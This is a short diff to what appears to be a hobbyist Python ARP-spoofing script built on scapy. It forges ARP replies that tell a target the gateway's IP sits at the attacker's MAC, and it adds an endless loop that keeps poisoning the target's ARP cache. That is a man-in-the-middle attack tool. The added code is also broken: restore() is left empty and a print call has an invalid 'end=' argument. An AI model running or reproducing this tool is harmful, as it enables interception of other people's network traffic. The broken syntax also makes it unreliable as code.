@@ -25,9 +25,14 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
     scapy.send(packet, timeout =1, verbose = False)
 
+def restore():
+
 
 options = get_arguments()
-#print(get_mac(options.target))
-#print(get_mac(options.gateway))
-spoof(options.target, options.gateway)
+counter = 0
+while True:
+   spoof(options.target, options.gateway)
+   print("\r Send packet: ", counter, end=)
+   counter +=1
+
 
